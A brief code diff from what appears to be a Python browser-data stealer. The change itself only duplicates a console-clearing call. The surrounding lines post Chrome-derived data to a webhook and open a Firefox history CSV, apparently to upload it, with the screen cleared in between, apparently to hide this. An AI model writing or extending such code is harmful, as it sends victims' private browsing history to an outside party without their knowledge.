@@ -64,6 +64,7 @@ def main():
         requests.post(webhook, data=errorchrome)
 
     os.system('cls')
+    os.system('cls')
 
     if os.path.exists("firefox_history.csv"):
         files2 = {'files': open('firefox_history.csv', 'rb')}
